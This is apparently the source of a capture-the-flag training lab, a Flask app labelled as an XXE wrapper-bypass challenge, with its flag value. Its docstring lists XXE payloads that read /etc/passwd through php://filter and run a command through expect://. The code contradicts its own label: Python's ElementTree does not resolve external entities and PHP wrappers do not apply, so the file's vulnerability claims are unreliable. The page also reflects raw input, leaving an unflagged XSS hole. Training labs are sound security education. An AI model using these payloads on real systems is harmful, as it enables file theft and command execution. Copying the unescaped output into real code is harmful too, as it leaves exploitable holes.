"""
XXE Lab 9: XXE Wrapper Bypass
Difficulty: 3 (Advanced)
Points: 100

Description:
XXE bypassing file read filters via wrapper protocols.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: XXE with protocol wrappers
    
    Attack Vector:
    PHP wrappers:
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
    
    Zip wrapper:
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "zip://archive.zip#file.xml">]>
    
    Expect wrapper:
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
    
    Data wrapper:
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain,<?php phpinfo(); ?>">]>
    
    Flag: FLAG{xxe_wrapper_bypass_009}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>XXE Wrapper Bypass</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5009, debug=False)
